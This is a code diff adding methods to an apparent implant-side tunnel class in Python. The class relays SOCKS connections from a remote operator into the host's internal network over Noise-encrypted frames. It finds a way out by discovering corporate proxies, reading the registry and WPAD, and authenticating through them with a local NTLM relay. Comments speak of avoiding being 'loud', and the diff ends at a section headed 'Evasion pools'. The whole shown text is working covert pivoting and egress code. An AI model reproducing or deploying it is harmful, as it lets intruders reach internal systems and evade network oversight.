+        logger.debug("tunnel: a relay asked for %s to %s (%s)",
+                     SOCKS_COMMAND_NAMES.get(cmd, cmd), target,
+                     SOCKS_ADDRESS_TYPE_NAMES.get(atyp, atyp))
+        if not socks_command_supported(cmd):
+            # BIND and UDP ASSOCIATE decode so that they can be refused
+            # properly: at the operator's end a parse error is
+            # indistinguishable from a dead tunnel.
+            logger.info("tunnel: the operator asked for %s to %s, which an "
+                        "endpoint does not serve",
+                        SOCKS_COMMAND_NAMES.get(cmd, cmd), target)
+            self._reply(sock, noise, REPLY_COMMAND_NOT_SUPPORTED)
+            return
+        try:
+            peer = self._dial_target(address, port, self.connect_timeout)
+        except (OSError, ValueError) as exc:
+            reply = _socks_reply_for_error(exc)
+            logger.info("tunnel: could not reach %s (%s); answering %s",
+                        target, exc, SOCKS_REPLY_NAMES.get(reply, reply))
+            self._reply(sock, noise, reply)
+            return
+        self._register_socket(peer)
+        try:
+            atyp_out, bound, bound_port = _bound_socks_address(peer)
+            # The reply is a frame of its own and carries nothing else.
+            # The operator's end reads it with one `recv_message` and
+            # refuses a frame that is not exactly a reply, so a target
+            # that speaks first -- and most do -- must not have its first
+            # bytes coalesced into this one.
+            self._reply(sock, noise, REPLY_SUCCEEDED, atyp_out, bound,
+                        bound_port)
+            self._count_session(1)
+            try:
+                logger.info("tunnel: carrying %s", target)
+                self._bridge(sock, noise, peer)
+            finally:
+                self._count_session(-1)
+        finally:
+            self._forget_socket(peer)
+            _shut_socket(peer)
+
+    def _reply(self, sock: socket.socket, noise: NoiseSession, reply: int,
+               atyp: int = ATYP_IPV4, address: str = "0.0.0.0",
+               port: int = 0) -> None:
+        """One SOCKS reply, as its own frame."""
+        write_frame(sock,
+                    noise.encrypt(encode_socks_reply(reply, atyp, address,
+                                                     port)))
+
+    def _dial_target(self, address: str, port: int,
+                     timeout: float) -> socket.socket:
+        """One TCP connection into the network this endpoint sits in.
+
+        The single place this class touches the target network, which is
+        also what makes it the one seam a test can stand in for a
+        condition a host cannot be made to produce on demand.
+        `create_connection` resolves a name and tries every address it is
+        given, which is what makes `ATYP=3` work and what reaches an IPv6
+        target wherever the host has a route to one.
+        """
+        return socket.create_connection((address, port), timeout=timeout)
+
+    def _bridge(self, relay: socket.socket, noise: NoiseSession,
+                peer: socket.socket) -> None:
+        """Carry bytes until either side is finished.
+
+        Neither descriptor has a timeout here. An idle session is an
+        ordinary thing -- a target that speaks first, an operator's shell
+        waiting on a prompt -- and `stop` unparks both directions by
+        shutting their descriptors down instead.
+
+        Each socket has exactly one writer, which is why neither direction
+        needs the lock the command channel has. This thread wrote the
+        reply and then carries the target's bytes to the relay, so it is
+        the only writer on the relay socket; the thread started here is
+        the only writer on the target socket. No reply is ever sent after
+        this point, which is what makes that hold.
+        """
+        relay.settimeout(None)
+        peer.settimeout(None)
+        back = threading.Thread(target=self._to_target,
+                                args=(relay, noise, peer),
+                                name="tunnel-relay-in", daemon=True)
+        try:
+            back.start()
+        except RuntimeError as exc:
+            # A one-way proxy is worse than none, so the session ends
+            # here: the caller closes both sockets and the operator sees
+            # the stream go.
+            logger.warning("tunnel: could not start the return direction of "
+                           "a relay; closing it: %s", exc)
+            return
+        try:
+            self._to_relay(relay, noise, peer)
+        finally:
+            # Both descriptors before the join: the other thread may be
+            # parked in a read or in a send that TCP backpressure has
+            # stopped, and neither wakes on its own.
+            _shutdown_socket(relay)
+            _shutdown_socket(peer)
+            back.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+
+    def _to_relay(self, relay: socket.socket, noise: NoiseSession,
+                  peer: socket.socket) -> None:
+        """The target's bytes, toward the operator."""
+        while True:
+            try:
+                data = peer.recv(_TUNNEL_CHUNK)
+            except OSError:
+                return
+            if not data:
+                # The target is finished, so the session is: whichever
+                # direction ends first ends it, because a SOCKS proxy that
+                # kept half of one open would leave the operator's tool
+                # waiting on a target that has gone.
+                return
+            try:
+                write_frame(relay, noise.encrypt(data))
+            except (OSError, ValueError):
+                return
+
+    def _to_target(self, relay: socket.socket, noise: NoiseSession,
+                   peer: socket.socket) -> None:
+        """The operator's bytes, toward the target."""
+        try:
+            self._to_target_loop(relay, noise, peer)
+        finally:
+            # This direction ending ends the session, as the other one
+            # does: the operator's port closes both of its directions
+            # together, so a half-open relay here would carry nothing and
+            # would hold a thread until the target happened to close.
+            _shutdown_socket(relay)
+            _shutdown_socket(peer)
+
+    def _to_target_loop(self, relay: socket.socket, noise: NoiseSession,
+                        peer: socket.socket) -> None:
+        while True:
+            try:
+                if not _bytes_waiting(relay):
+                    # A FIN between frames: the operator's end is done.
+                    # The peek is what keeps that ordinary teardown out of
+                    # the warning below, since `read_frame` reports it
+                    # with the same exception as a truncated frame.
+                    return
+                frame = read_frame(relay)
+            except OSError:
+                return
+            except ValueError as exc:
+                logger.warning("tunnel: a relay frame was malformed (%s); "
+                               "the session is over", exc)
+                return
+            try:
+                data = noise.decrypt(frame)
+            except ValueError as exc:
+                # Noise §5.1 again, on the relay this time.
+                logger.warning("tunnel: a relay frame did not authenticate "
+                               "(%s); the session is over", exc)
+                return
+            try:
+                peer.sendall(data)
+            except OSError:
+                return
+
+    # ── getting out ──
+
+    def _dial(self, port: int) -> socket.socket:
+        """One TCP stream to `self.server:port`, by the first way out.
+
+        A configured proxy, then whatever `ProxyDiscovery` finds, then
+        direct. The way that worked last is tried first, so a relay does
+        not re-walk the list; when that fails the whole list is walked
+        again, because what broke may be the proxy rather than the tunnel.
+        """
+        attempts = []
+        for route in self._routes():
+            try:
+                return self._dial_route(route, port)
+            except OSError as exc:
+                attempts.append("%s: %s" % (_route_name(route), exc))
+        raise OSError("no way out to %s:%d -- %s"
+                      % (self.server, port, "; ".join(attempts)))
+
+    def _routes(self) -> list:
+        """The ways out, in the order they are tried. `None` is direct."""
+        ordered = []
+        with self._lock:
+            if self._route_known:
+                ordered.append(self._route)
+        if self.proxy_mode != "none":
+            for route in self._configured_routes() + self._discovered_routes():
+                if route not in ordered:
+                    ordered.append(route)
+        if None not in ordered:
+            # Direct is always last and always tried: a proxy that has
+            # stopped answering must not take the tunnel with it.
+            ordered.append(None)
+        return ordered
+
+    def _configured_routes(self) -> list:
+        """The proxy this build was told to use, if it was told one."""
+        routes = []
+        relay = self._ntlm_route()
+        if relay is not None:
+            routes.append(relay)
+        endpoint = _proxy_endpoint(self.proxy_url)
+        if endpoint is not None:
+            routes.append(endpoint)
+        return routes
+
+    def _ntlm_route(self) -> Optional[Tuple[str, int]]:
+        """The local NTLM relay's address, starting it if it is configured.
+
+        `_NtlmProxyRelay` is a CONNECT proxy on loopback that performs the
+        NTLM handshake against the corporate one, so what this class does
+        with it is what it does with any proxy: dial it and write a
+        CONNECT. That indirection exists because the NTLM exchange has to
+        happen on the same TCP connection as the CONNECT it authorises,
+        which is not something a caller of this class could arrange.
+        """
+        cfg = self._proxy_ntlm
+        if not cfg.get("enabled"):
+            return None
+        with self._lock:
+            started = self._ntlm_relay
+        if started is not None:
+            return "127.0.0.1", started.port
+        host = str(cfg.get("host") or "").strip()
+        username = cfg.get("username") or ""
+        password = cfg.get("password") or ""
+        if not host or not username or not password:
+            logger.warning("tunnel: proxy NTLM is enabled but its host or "
+                           "credentials are missing; skipping the relay")
+            return None
+        try:
+            relay = _NtlmProxyRelay(
+                host, int(cfg.get("port") or 8080), username, password,
+                domain=cfg.get("domain", ""),
+                workstation=cfg.get("workstation", ""))
+            relay.start()
+        except (OSError, RuntimeError) as exc:
+            # A local port it could not bind, or no thread to serve it
+            # with. Either way the other ways out are still there.
+            logger.warning("tunnel: the NTLM proxy relay would not start "
+                           "(%s); falling back", exc)
+            return None
+        with self._lock:
+            if self._ntlm_relay is None:
+                self._ntlm_relay = relay
+                relay = None
+            started = self._ntlm_relay
+        if relay is not None:
+            # Another thread won the race; one local port is enough.
+            relay.stop()
+        return "127.0.0.1", started.port
+
+    def _discovered_routes(self) -> list:
+        """What `ProxyDiscovery` finds, run once per endpoint and cached.
+
+        Once, because discovery shells out, reads the registry and makes
+        two DNS lookups for WPAD, and a relay that re-ran all of that per
+        session would be slow and loud in equal measure. PAC and WPAD
+        entries are skipped: their URL is a script to fetch and evaluate,
+        not a proxy a CONNECT can be written to.
+        """
+        with self._lock:
+            cached = self._discovered
+        if cached is not None:
+            return cached
+        routes = []
+        try:
+            for proxy in ProxyDiscovery().discover_all():
+                if proxy.get("is_pac"):
+                    continue
+                endpoint = _proxy_endpoint(proxy.get("url"))
+                if endpoint is not None and endpoint not in routes:
+                    routes.append(endpoint)
+        except Exception as exc:
+            # Discovery runs `gsettings`, reads the Windows registry and
+            # resolves names. A host where one of those misbehaves still
+            # has a direct route to try.
+            logger.debug("tunnel: proxy discovery failed: %s", exc)
+        with self._lock:
+            self._discovered = routes
+        return routes
+
+    def _dial_route(self, route: Optional[Tuple[str, int]],
+                    port: int) -> socket.socket:
+        """One TCP stream by one way out, remembered if it works."""
+        if route is None:
+            sock = socket.create_connection((self.server, port),
+                                            timeout=self.connect_timeout)
+        else:
+            sock = socket.create_connection(route,
+                                            timeout=self.connect_timeout)
+            try:
+                self._write_connect(sock, port)
+            except OSError:
+                _shut_socket(sock)
+                raise
+        with self._lock:
+            self._route, self._route_known = route, True
+        return sock
+
+    def _write_connect(self, sock: socket.socket, port: int) -> None:
+        """`CONNECT <server>:<port>`, and the proxy's answer to it.
+
+        Written here rather than left to urllib because what follows on
+        this socket is Noise and not HTTP: urllib would own the stream.
+        The target is the tunnel server's single port, which is the whole
+        reason there is only one of them -- a second, unpredictable
+        destination port is what a default Squid configuration refuses.
+        """
+        target = "%s:%d" % (self.server, port)
+        sock.settimeout(self.connect_timeout)
+        sock.sendall(("CONNECT %s HTTP/1.1\r\nHost: %s\r\n"
+                      "Proxy-Connection: Keep-Alive\r\n\r\n"
+                      % (target, target)).encode("ascii"))
+        status = _proxy_read_line(sock)
+        for _ in range(_PROXY_MAX_HEADERS):
+            if not _proxy_read_line(sock):
+                break
+        fields = status.split(" ")
+        if len(fields) < 2 or fields[1] != "200":
+            # 407 lands here as well as 403: this class has no credentials
+            # of its own to offer, and the NTLM relay above is the path
+            # for a proxy that wants some.
+            raise OSError("the proxy answered %r to CONNECT %s"
+                          % (status, target))
+
+    # ── bookkeeping ──
+
+    def _handshake(self, sock: socket.socket, payload: bytes) -> NoiseSession:
+        """The initiator's two messages, with `payload` inside the first."""
+        sock.settimeout(self.connect_timeout)
+        noise = NoiseSession.initiator(self._public, self._psk)
+        write_frame(sock, noise.initiate(payload))
+        noise.complete(read_frame(sock))
+        return noise
+
+    def _egress(self) -> Optional[str]:
+        with self._lock:
+            if not self._route_known:
+                return None
+            return _route_name(self._route)
+
+    @staticmethod
+    def _crypto_path() -> str:
+        """Which AES backend this process has: `openssl` or `pure-python`.
+
+        Read through the module rather than copied at construction, so a
+        test that forces the slow backend sees it here too.
+        """
+        return "pure-python" if _USE_PURE_PYTHON_AES else "openssl"
+
+    def _register_socket(self, sock: socket.socket) -> None:
+        with self._lock:
+            self._relay_sockets.add(sock)
+
+    def _forget_socket(self, sock: socket.socket) -> None:
+        with self._lock:
+            self._relay_sockets.discard(sock)
+
+    def _count_session(self, delta: int) -> None:
+        with self._lock:
+            self._sessions += delta
+            if delta > 0:
+                self._carried += delta
 
 
 # ── Evasion pools ──
